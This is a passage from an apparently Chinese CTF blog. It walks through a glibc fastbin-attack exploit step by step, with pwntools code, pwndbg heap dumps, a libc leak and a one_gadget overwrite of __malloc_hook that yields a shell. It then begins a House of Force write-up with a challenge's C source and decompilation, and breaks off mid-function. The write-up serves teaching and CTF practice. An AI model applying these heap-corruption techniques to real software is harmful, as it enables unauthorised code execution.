payload)#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处alloc(0x60)#index4alloc(0x60)#index6#然后往malloc_hook上写one_gadget的地址payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6, payload)#再申请一下触发one_gadgetalloc(255)p.interactive()\n漏洞利用思路\n从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：\n\n利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）\n利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。\n\n1. leak libc_addr\n1-1 模仿程序功能\ndef alloc(size):    p.recvuntil(\"Command: \")    p.sendline(\"1\")    p.recvuntil(\"Size: \")    p.sendline(str(size))def fill(idx, content):    p.recvuntil(\"Command: \")    p.sendline(\"2\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvuntil(\"Size: \")    p.sendline(str(len(content)))    p.recvuntil(\"Content: \")    p.send(content)def free(idx):    p.recvuntil(\"Command: \")    p.sendline(\"3\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))def dump(idx):    p.recvuntil(\"Command: \")    p.sendline(\"4\")    p.recvuntil(\"Index: \")    p.sendline(str(idx))    p.recvline()    return p.recvline()\n这4个函数分别对应程序的四个主要功能，这里就不多说了。\n1-2 申请 5个chunk\n由于我们希望使用 unsorted bin 来泄漏 libc 基地址，**所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。**具体设计如下：\nalloc(0x10)#index0alloc(0x10)#index1alloc(0x10)#index2alloc(0x10)#index3alloc(0x80)#index4\n执行完此payload之后的heap情况如下：\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4......（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk\n此时程序结构体中的情况：\n0x5fcead98720:\t0x0000000000000000\t0x00000000000000000x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000001    \t\t\t\t\t\t\t\t#index10x5fcead98750:\t0x0000000000000010\t0x00005555557570300x5fcead98760:\t0x0000000000000001\t0x0000000000000010     \t\t\t#index20x5fcead98770:\t0x0000555555757050\t0x0000000000000001    \t\t\t\t\t\t\t\t#index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000001\t0x0000000000000080    \t\t\t#index40x5fcead987a0:\t0x0000555555757090\t0x00000000000000000x5fcead987b0:\t0x0000000000000000\t0x0000000000000000\n1-3 free创建的index1和index2\n#free两个,这时候会放到fastbins中,而且因为是后进的,所以#fastbin[0]-&gt;index2-&gt;index1-&gt;NULLfree(1)free(2)\n执行此部分payload，来看一下堆状况：\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000555555757020\t0x0000000000000000    \t\t\t#fd指针指向index1的起始地址0x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index40x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk.....（省略内容均为空）pwndbg&gt;\n此时的bin和main_arena情况：\npwndbg&gt; binfastbins0x20: 0x0000555555757020-&gt;0x555555757040 ◂— 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000000000000\t0x0000555555757040 #index20x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000555555757110 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b780x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88pwndbg&gt;\n程序的结构体状况如下：\n0x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000000    \t\t\t\t\t\t\t\t#index1（chunk_flag置零）0x5fcead98750:\t0x0000000000000000\t0x0000000000000000                #chunk_content_size置零   #chunk_data_ptr置空     0x5fcead98760:\t0x0000000000000000\t0x0000000000000000     \t\t\t#index2（chunk_flag置零）  #chunk_data_size置零     0x5fcead98770:\t0x0000000000000000\t0x0000000000000001    \t\t\t#chunk_data_ptr置空  #index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000001\t0x0000000000000080    \t\t\t#index40x5fcead987a0:\t0x0000555555757090\t0x00000000000000000x5fcead987b0:\t0x0000000000000000\t0x0000000000000000\n1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针\npayload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p8(0x80)fill(0, payload)\n还记得上面提到的程序漏洞吗？\n第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的chunk_content_size写入到结构体中，并且之前alloc chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。\n这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。\n执行payload之后的内存空间如下：\n\nchunk2-&gt;fd已成功修改为chunk4的起始地址（这个起始地址是指向chunk header的）\n\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x0000000000000000                #payload从这里开始修改堆块内容0x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index2（fastbin）0x555555757050:\t0x0000555555757080\t0x0000000000000000    \t\t\t#此处的fd指针已经被修改--------------------------------------------------------------    执行payload前原来的内容为：0x555555757050:\t0x0000555555757020\t0x0000000000000000--------------------------------------------------------------    0x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4（fastbin）0x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk.....（省略内容均为空）pwndbg&gt;  \n1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21\n#然后再通过index3去进行写入,把index4的大小改成0x21#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)payload = p64(0)*3payload += p64(0x21)fill(3, payload)\n0x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index2（fastbin）0x555555757050:\t0x0000555555757080\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000021 #index4（fastbin）--------------------------------------------------------------    执行payload前原来的内容为：0x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4（fastbin）-------------------------------------------------------------- .....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk.....（省略内容均为空）0x555555757180:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。结构体状况未发生改变。\n1-6 申请 index4\n#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了alloc(0x10)alloc(0x10)#申请成功之后index2就指向index4\n首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2-&gt;index1，后来我们修改index2-&gt;fd为index4的地址，fastbin里变为\nindex2-&gt;index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。\n看一下堆：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x555555757000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757020Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757040Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757060Size: 0x21Allocated chunkAddr: 0x555555757080Size: 0x00pwndbg&gt; \n此时的内存：\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000021 #index40x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk0x555555757120:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757180:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n此时的结构体状况：\n0x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000001    \t\t\t\t\t\t\t\t#index1（chunk_flag改变）0x5fcead98750:\t0x0000000000000010\t0x0000555555757050                #chunk_content_size（改变）   #chunk_data_ptr（改变）     0x5fcead98760:\t0x0000000000000001\t0x0000000000000010     \t\t\t#index2（chunk_flag改变）  #chunk_data_size（改变）     0x5fcead98770:\t0x0000555555757090\t0x0000000000000001    \t\t\t#chunk_data_ptr（改变）  #index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000001\t0x0000000000000080    \t\t\t#index40x5fcead987a0:\t0x0000555555757090\t0x00000000000000000x5fcead987b0:\t0x0000000000000000\t0x0000000000000000\n注意，此时我们有两个地方指向index4：\nindex4的content指针（程序的正常指向）\nindex2的content指针 （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）\n第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。\n也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。\n1-7 修改 index4 的 size 为0x91\n#为了让index4能够被放到unsortedbin中,要把它的大小改回来payload = p64(0)*3payload += p64(0x91)fill(3, payload)\npwndbg&gt; x/50gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index40x555555757090:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000020ef1 #top_chunk0x555555757120:\t0x0000000000000000\t0x0000000000000000.....（省略内容均为空）0x555555757180:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n程序结构体未发生变化\n1-8 申请新堆块 index 5\n目的只是为了防止 index4 释放后与 top chunk 合并\n1-9 free(index4)，index4 放入 unsorted bin 中\n#这时候free就会把index4放到unsorted中了free(4)\nFree chunk (unsortedbin) | PREV_INUSEAddr: 0x555555757080Size: 0x91fd: 0x00bk: 0x7ffff7dd1b78pwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000091 #index4（unsortedbin）0x555555757090:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b78.....（省略内容均为空）0x555555757110:\t0x0000000000000000\t0x0000000000000090 #index5.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt;\n当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。\n0x5fcead98730:\t0x0000000000000001\t0x0000000000000010    \t\t\t#index00x5fcead98740:\t0x0000555555757010\t0x0000000000000001    \t\t\t\t\t\t\t\t#index10x5fcead98750:\t0x0000000000000010\t0x0000555555757050    0x5fcead98760:\t0x0000000000000001\t0x0000000000000010     \t\t\t#index2     0x5fcead98770:\t0x0000555555757090\t0x0000000000000001    \t\t\t\t\t\t\t    #index30x5fcead98780:\t0x0000000000000010\t0x00005555557570700x5fcead98790:\t0x0000000000000000\t0x0000000000000000    \t\t\t#index4（此处发生了改变）#（此处发生了改变）     0x5fcead987a0:\t0x0000000000000000\t0x0000000000000001    \t\t\t#（此处发生了改变）\t   #index50x5fcead987b0:\t0x0000000000000080\t0x0000555555757120\n1-10 计算libc基址\n-----------------------------------------------------------------------------还可以直接这样写libc_base = u64(dump(2)[:8].strip().ljust(8, \"\\x00\"))-0x3c4b78-----------------------------------------------------------------------------示例payload的写法：#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了#main_arena与libc偏移为0x3c4b20(附件中有工具)#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移unsorted_offset_mainarena=unsorted_offset_arena(5)#这函数还不太明白unsorted_addr=u64(dump(2)[:8].strip().ljust(8, \"\\x00\"))libc_base=unsorted_addr-0x3c4b20-unsorted_offset_mainarenalog.info(\"libc_base: \"+hex(libc_base))    def unsorted_offset_arena(idx):    word_bytes = context.word_size / 8    offset = 4  # lock    offset += 4  # flags    offset += word_bytes * 10  # offset fastbin    offset += word_bytes * 2  # top,last_remainder    offset += idx * 2 * word_bytes  # idx    offset -= word_bytes * 2  # bin overlap    return offset-----------------------------------------------------------------------------\n2. 控制_malloc_hook\n2-1 申请 unsorted bin 中的 chunk\nalloc(0x60)\n由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。\n看一下此时的堆内存：\npwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000071 #index4(由unsortedbin分裂).....（省略内容均为空）0x5555557570f0:\t0x0000000000000000\t0x0000000000000021 #index5(由unsortedbin分裂)0x555555757100:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b780x555555757110:\t0x0000000000000020\t0x0000000000000090 #index6（原index5）.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：\npwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall [corrupted]FD: 0x5555557570f0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557570f0BK: 0x5555557570f0 ◂— 0x90----------------------------------------------------------------------执行payload前：unsortedbinall [corrupted]FD: 0x555555757080 ◂— 0x0BK: 0x555555757080 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757080----------------------------------------------------------------------smallbinsemptylargebinsemptypwndbg&gt; \n2-2 free(index4)\n#index2_content指针还是指向index4_chunk_data#为了修改之后index4的fd指针，因此我们可以先释放index4free(4)\npwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x555555757080 ◂— 0x00x80: 0x0unsortedbin （这里显示不准确）all: 0x0smallbinsemptylargebinsemptypwndbg&gt;\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x555555757000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757020Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757040Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x555555757060Size: 0x71Allocated chunk | PREV_INUSEAddr: 0x5555557570d0Size: 0x21Allocated chunkAddr: 0x5555557570f0Size: 0x90Allocated chunk | PREV_INUSEAddr: 0x555555757180Size: 0x20e61pwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000071 #index4（fastbin）.....（省略内容均为空）0x5555557570f0:\t0x0000000000000000\t0x0000000000000021 #index5（unsortedbin）0x555555757100:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b780x555555757110:\t0x0000000000000020\t0x0000000000000090 #index6.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n0x5fcead98730:  0x0000000000000001  0x0000000000000010                #index00x5fcead98740:  0x0000555555757010  0x0000000000000001                                    #index10x5fcead98750:  0x0000000000000010  0x0000555555757050    0x5fcead98760:  0x0000000000000001  0x0000000000000010                #index2     0x5fcead98770:  0x0000555555757090  0x0000000000000001                                    #index30x5fcead98780:  0x0000000000000010  0x00005555557570700x5fcead98790:  0x0000000000000000  0x0000000000000000                #index4（此处发生了改变）#（此处发生了改变）     0x5fcead987a0:  0x0000000000000000  0x0000000000000001                #（此处发生了改变）     #index6（原index5）0x5fcead987b0:  0x0000000000000080  0x0000555555757120\n2-3 修改index4的fd指针\n#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小#这个地址是main_arena-0x40+0xd,具体看后面图片解释payload = p64(libc_base+0x3c4aed)fill(2, payload)\npwndbg&gt; x/60gx 0x5555557570000x555555757000:\t0x0000000000000000\t0x0000000000000021 #index00x555555757010:\t0x0000000000000000\t0x00000000000000000x555555757020:\t0x0000000000000000\t0x0000000000000021 #index10x555555757030:\t0x0000000000000000\t0x00000000000000000x555555757040:\t0x0000000000000000\t0x0000000000000021 #index20x555555757050:\t0x0000000000000000\t0x00000000000000000x555555757060:\t0x0000000000000000\t0x0000000000000021 #index30x555555757070:\t0x0000000000000000\t0x00000000000000000x555555757080:\t0x0000000000000000\t0x0000000000000071 #index4（fastbin）0x555555757090:\t0x00007ffff7dd1aed\t0x0000000000000000    \t\t\t#更改index4的fd指针.....（省略内容均为空）0x5555557570f0:\t0x0000000000000000\t0x0000000000000021 #index5（unsortedbin）0x555555757100:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b780x555555757110:\t0x0000000000000020\t0x0000000000000090 #index6.....（省略内容均为空）0x5555557571a0:\t0x0000000000000000\t0x0000000000020e61 #top_chunk.....（省略内容均为空）0x5555557571d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \npwndbg&gt; x/16gx 0x00007ffff7dd1aed0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:\t0xfff7dd0260000000\t0x000000000000007f0x7ffff7dd1afd:\t0xfff7a92ea0000000\t0xfff7a92a7000007f0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:\t0x000000000000007f\t0x00000000000000000x7ffff7dd1b1d:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b2d &lt;main_arena+13&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b3d &lt;main_arena+29&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b4d &lt;main_arena+45&gt;:\t0x5555757080000000\t0x00000000000000550x7ffff7dd1b5d &lt;main_arena+61&gt;:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n2-4 控制__malloc_hook\n#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处alloc(0x60)#index4alloc(0x60)#index7\n0x5fcead98730:  0x0000000000000001  0x0000000000000010                #index00x5fcead98740:  0x0000555555757010  0x0000000000000001                                    #index10x5fcead98750:  0x0000000000000010  0x0000555555757050    0x5fcead98760:  0x0000000000000001  0x0000000000000010                #index2     0x5fcead98770:  0x0000555555757090  0x0000000000000001                                    #index30x5fcead98780:  0x0000000000000010  0x00005555557570700x5fcead98790:  0x0000000000000001  0x0000000000000060                #index4（此处发生了改变）#（此处发生了改变）     0x5fcead987a0:  0x0000555555757090  0x0000000000000001                #（此处发生了改变）     #index6（原index5）0x5fcead987b0:  0x0000000000000080  0x00005555557571200x5fcead987c0:\t0x0000000000000001\t0x0000000000000060    \t\t\t#index70x5fcead987d0:\t0x00007ffff7dd1afd\t0x0000000000000000pwndbg&gt; \n2-5 写入 one_gadget 并 getshell\n#然后往malloc_hook上写one_gadget的地址payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6, payload)gdb.attach(p)\n2-6 最后申请一个chunk\nalloc(0x60)\n最后就能get shell 了\n","categories":["heap"],"tags":["fastbin attack"]},{"title":"House of Force","url":"/2023/09/12/House%20of%20Force/","content":"House Of Force（控制top_chunk）（基础）\n\n参考资料：\nCTF-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\n附件下载：\n链接: https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA  密码: np57\n–来自百度网盘超级会员V3的分享\nHouse Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。\n\n\n题目来源：HITCON training lab 11\n附件：\n链接: https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ  密码: abtk\n–来自百度网盘超级会员V3的分享\n\n\nLinux环境\n老规矩，checksec一下文件先\n\n计算一下 main_arena 距离 libc 的距离\n\n程序源代码©\n#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;struct item {  int size;  char *name;};struct item itemlist[100] = {0};int num;void hello_message() {  puts(\"There is a box with magic\");  puts(\"what do you want to do in the box\");}void goodbye_message() {  puts(\"See you next time\");  puts(\"Thanks you\");}struct box {  void (*hello_message)();  void (*goodbye_message)();};void menu() {  puts(\"----------------------------\");  puts(\"Bamboobox Menu\");  puts(\"----------------------------\");  puts(\"1.show the items in the box\");  puts(\"2.add a new item\");  puts(\"3.change the item in the box\");  puts(\"4.remove the item in the box\");  puts(\"5.exit\");  puts(\"----------------------------\");  printf(\"Your choice:\");}void show_item() {  int i;  if (!num) {    puts(\"No item in the box\");  } else {    for (i = 0; i &lt; 100; i++) {      if (itemlist[i].name) {        printf(\"%d : %s\", i, itemlist[i].name);      }    }    puts(\"\");  }}int add_item() {  char sizebuf[8];  int length;  int i;  int size;  if (num &lt; 100) {    printf(\"Please enter the length of item name:\");    read(0, sizebuf, 8);    length = atoi(sizebuf);    if (length == 0) {      puts(\"invaild length\");      return 0;    }   \tfor (i = 0; i &lt; 100; i++) {      if (!itemlist[i].name) {        itemlist[i].size = length;        itemlist[i].name = (char *)malloc(length);        printf(\"Please enter the name of item:\");        size = read(0, itemlist[i].name, length);        itemlist[i].name[size] = '\\x00';        num++;        break;      }    }  } else {    puts(\"the box is full\");  }  return 0;}void change_item() {  char indexbuf[8];  char lengthbuf[8];  int length;  int index;  int readsize;  if (!num) {    puts(\"No item in the box\");  } else {    printf(\"Please enter the index of item:\");    read(0, indexbuf, 8);    index = atoi(indexbuf);    if (itemlist[index].name) {      printf(\"Please enter the length of item name:\");      read(0, lengthbuf, 8);      length = atoi(lengthbuf);      printf(\"Please enter the new name of the item:\");      readsize = read(0, itemlist[index].name, length);      *(itemlist[index].name + readsize) = '\\x00';    } else {      puts(\"invaild index\");    }  }}void remove_item() {  char indexbuf[8];  int index;  if (!num) {    puts(\"No item in the box\");  } else {    printf(\"Please enter the index of item:\");    read(0, indexbuf, 8);    index = atoi(indexbuf);    if (itemlist[index].name) {      free(itemlist[index].name);      itemlist[index].name = 0;      itemlist[index].size = 0;      puts(\"remove successful!!\");      num--;    } else {      puts(\"invaild index\");    }  }}void magic() {  int fd;  char buffer[100];  fd = open(\"./flag\", O_RDONLY);  read(fd, buffer, sizeof(buffer));  close(fd);  printf(\"%s\", buffer);  exit(0);}int main() {  char choicebuf[8];  int choice;  struct box *bamboo;  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  bamboo = malloc(sizeof(struct box));  bamboo-&gt;hello_message = hello_message;  bamboo-&gt;goodbye_message = goodbye_message;  bamboo-&gt;hello_message();  while (1) {    menu();    read(0, choicebuf, 8);    choice = atoi(choicebuf);    switch (choice) {    case 1:      show_item();      break;    case 2:      add_item();      break;    case 3:      change_item();      break;    case 4:      remove_item();      break;    case 5:      bamboo-&gt;goodbye_message();      exit(0);      break;    default:      puts(\"invaild choice!!!\");      break;    }  }  return 0;}\nIDA静态分析\nmain函数\nint __cdecl main(int argc, const char **argv, const char **envp){  void (**v4)(void); // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+18h] [rbp-8h]  v6 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  v4 = (void (**)(void))malloc(0x10uLL);  *v4 = (void (*)(void))hello_message;  v4[1] = (void (*)(void))goodbye_message;  (*v4)();  while ( 1 )  {    menu();    read(0, buf, 8uLL);    switch ( atoi(buf) )    {      case 1:        show_item();        break;      case 2:        add_item();        break;      case 3:        change_item(buf, buf);        break;      case 4:        remove_item();        break;      case 5:        v4[1]();        exit(0);      default:        puts(\"invaild choice!!!\");        break;    }  }}\n​\tmain函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。\nmeau函数\nvoid __cdecl menu(){  puts(\"----------------------------\");  puts(\"Bamboobox Menu\");  puts(\"----------------------------\");  puts(\"1.show the items in the box\");  puts(\"2.add a new item\");  puts(\"3.change the item in the box\");  puts(\"4.remove the item in the box\");  puts(\"5.exit\");  puts(\"----------------------------\");  printf(\"Your choice:\");}\n这是一个程序的菜单函数，没有什么特别的。\nshow_item\nint show_item(){  int i; // [rsp+Ch] [rbp-4h]  if ( !num )    return puts(\"No item in the box\");  for ( i = 0; i &lt;= 99; ++i )  {    if ( itemlist[i].content )      printf(\"%d : %s\", (unsigned int)i, itemlist[i].content);\t//老老实实打印堆块的内容  }  return puts(byte_401089);}\n首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。\nadd_item\n__int64 add_item(){  int i; // [rsp+4h] [rbp-1Ch]  int v2; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = 